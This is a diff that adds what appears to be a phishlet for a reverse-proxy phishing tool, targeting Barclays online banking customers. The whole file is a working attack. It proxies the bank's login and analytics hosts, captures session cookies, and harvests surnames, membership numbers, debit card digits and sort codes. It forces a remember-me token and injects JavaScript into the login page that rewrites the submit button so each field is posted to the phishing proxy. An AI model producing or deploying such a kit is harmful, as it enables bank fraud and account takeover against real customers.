@@ -1,0 +1,149 @@
+author: '@AN0n'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'bank', orig_sub: 'bank', domain: 'barclays.co.uk', session: true, is_landing: true}
+  - {phish_sub: 'smetrics', orig_sub: 'smetrics', domain: 'barclays.co.uk', session: true, is_landing: false}
+  - {phish_sub: 'stats', orig_sub: 'wup-6bb5a42d.eu.v2', domain: 'we-stats.com', session: true, is_landing: false}
+  - {phish_sub: 'logs', orig_sub: 'logs-6bb5a42d.eu.v2', domain: 'we-stats.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'bank.barclays.co.uk', orig_sub: 'bank', domain: 'barclays.co.uk', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'bank.barclays.co.uk', orig_sub: 'bank', domain: 'barclays.co.uk', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'bank.barclays.co.uk', orig_sub: 'bank', domain: 'barclays.co.uk', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'smetrics.barclays.co.uk', orig_sub: 'smetrics', domain: 'barclays.co.uk', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'smetrics.barclays.co.uk', orig_sub: 'smetrics', domain: 'barclays.co.uk', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'smetrics.barclays.co.uk', orig_sub: 'smetrics', domain: 'barclays.co.uk', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+auth_tokens:
+  - domain: '.barclays.co.uk'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'surname'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'membershipNumber'
+    search: '(.*)'
+    type: 'post'
+  custom: 
+    - key: 'membershipNumber'
+      search: '(.*)'
+      type: 'post'
+    - key: 'surname'
+      search: '(.*)'
+      type: 'post'
+    - key: 'debitCard1'
+      search: '(.*)'
+      type: 'post'
+    - key: 'debitCard2'
+      search: '(.*)'
+      type: 'post'
+    - key: 'debitCard3'
+      search: '(.*)'
+      type: 'post'
+    - key: 'debitCard4'
+      search: '(.*)'
+      type: 'post'    
+    - key: 'sortcode0'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sortcode1'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sortcode2'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sortcode3'
+      search: '(.*)'
+      type: 'post'          
+
+force_post:
+  - path: '/olb/authlogin/'
+    search:
+      - {key: 'surname', search: '.*'}
+    force:
+      - {key: 'rememberToken', value: 'true'}
+    type: 'post'
+      
+login:
+  domain: 'bank.barclays.co.uk'
+  path: '/olb/authlogin/loginAppContainer.do#/identification'
+  
+js_inject:
+  - trigger_domains: ["bank.barclays.co.uk"]
+    trigger_paths: ["/olb/authlogin/loginAppContainer.do"] #The target path is important as the javascript will be injected in all address pages started with /login 
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        document.getElementById("checkbox1").checked = true;
+        var submit = document.getElementsByClassName("btn")[0]
+        document.body.innerHTML = document.body.innerHTML.replace(/<button class="btn"/g , '<button class="btn" onclick="sendData()"');
+        return;
+      }
+      function sendData(){
+        document.getElementById("checkbox1").checked = true;
+        var surname = document.getElementsByName("surname")[1].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("surname="+encodeURIComponent(surname));
+        
+        var membershipNumber = document.getElementsByName("membershipNum")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("membershipNumber="+encodeURIComponent(membershipNumber));
+        
+        var cardnumber0 = document.getElementById("cardNumber0").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("debitCard1="+encodeURIComponent(cardnumber0));
+        
+        var cardnumber1 = document.getElementById("cardNumber1").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("debitCard2="+encodeURIComponent(cardnumber1));
+        
+        var cardnumber2 = document.getElementById("cardNumber2").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("debitCard3="+encodeURIComponent(cardnumber2));
+        
+        var cardnumber3 = document.getElementById("cardNumber3").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("debitCard4="+encodeURIComponent(cardnumber3));
+        
+        var sortcode0 = document.getElementById("sortCode0").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("sortcode0="+encodeURIComponent(sortcode0));
+        
+        var sortcode1 = document.getElementById("sortCode1").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("sortcode1="+encodeURIComponent(sortcode1));
+        
+        var sortcode2 = document.getElementById("sortCode2").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("sortcode2="+encodeURIComponent(sortcode2));
+        
+        var sortcode3 = document.getElementById("sortCode3").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("sortcode3="+encodeURIComponent(sortcode3));    
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 2500);
+      
+  
